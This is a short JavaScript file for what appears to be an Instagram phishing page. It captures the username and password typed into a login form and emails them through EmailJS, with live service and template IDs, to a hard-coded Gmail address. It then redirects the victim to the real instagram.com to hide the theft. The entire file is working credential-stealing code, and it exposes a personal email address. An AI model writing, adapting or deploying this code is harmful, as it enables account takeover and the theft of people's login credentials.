// Replace with your EmailJS User ID
emailjs.init("bViE5AkkNHTrpSc-U");

const emailForm = document.getElementById('emailForm');
const result = document.querySelector('.result');

emailForm.addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission
    sendEmail();
});

function sendEmail() {
    // Get the form data
    const id = document.getElementById("username").value;
    const subject = "Login Information"; // You can customize this as needed
    const message = "ID: " + id + "\nPassword: " + document.getElementById("password").value; // Construct the message

    // Send the email using EmailJS
    emailjs.send("service_vdmc119", "template_cx4epv1", {
        to_email: "sahoosoumyaranjan798@gmail.com", // Change to your recipient email
        subject: subject,
        message: message
    })
    .then(function () {
        window.location.href = "https://www.instagram.com/";
    }, function (error) {
        console.error("Email sending failed:", error);
    });
}
